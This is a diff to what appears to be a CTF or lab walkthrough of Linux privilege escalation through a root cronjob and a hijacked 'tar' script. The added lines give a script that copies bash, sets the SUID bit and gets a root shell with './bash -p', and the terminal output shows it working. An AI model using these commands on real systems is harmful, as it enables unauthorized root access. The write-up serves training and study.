@@ -145,7 +145,35 @@ chmod u+s /usr/bin/find
 ```
 Apply executable permissions `chmod +x tar`.
 
-So once the above code executes, we will be able to obtain root by using the SUID bypass exploit for the binary `find`.
+So once the above code executes, we will be able to obtain root by using the SUID bypass exploit for the binary `find`. There are other alternatives are there instead of using binary `find` we can use `/usr/bin/bash` as well.
+
+```sh
+#!/bin/bash
+
+cp /bin/bash /home/alfredo/restapi/bash; chmod u+s /home/alfredo/restapi/bash;
+```
+
+Once the script is executed as root, it copies `bash` to restapi folder and applies permission to execute the binary as owner in our case that would be the root user and that the SUID bit is set.
+
+After the bash binary is placed in the restapi folder check the file permissions and execute the below to obtain root.
+
+```sh
+[alfredo@fedora restapi]$ pwd
+/home/alfredo/restapi
+[alfredo@fedora restapi]$ ls -al
+total 1372
+drwxr-xr-x. 3 alfredo alfredo      77 Sep 22 02:26 .
+drwx------. 4 alfredo alfredo     127 Mar 28 03:18 ..
+-rw-r--r--. 1 alfredo alfredo     198 Mar 28 03:18 app.py
+-rwsr-xr-x  1 root    root    1390080 Sep 22 02:31 bash
+-rw-r--r--. 1 alfredo alfredo    2509 Mar 28 03:18 main.py
+drwxr-xr-x. 2 alfredo alfredo      32 Mar 28 03:18 __pycache__
+-rwxr-xr-x  1 alfredo alfredo      92 Sep 22 02:25 tar
+[alfredo@fedora restapi]$ ./bash -p
+bash-5.1# whoami
+root
+bash-5.1#
+```
 
 Wait for 60 seconds for the cronjob to complete, then use the below command to obtain root.
 
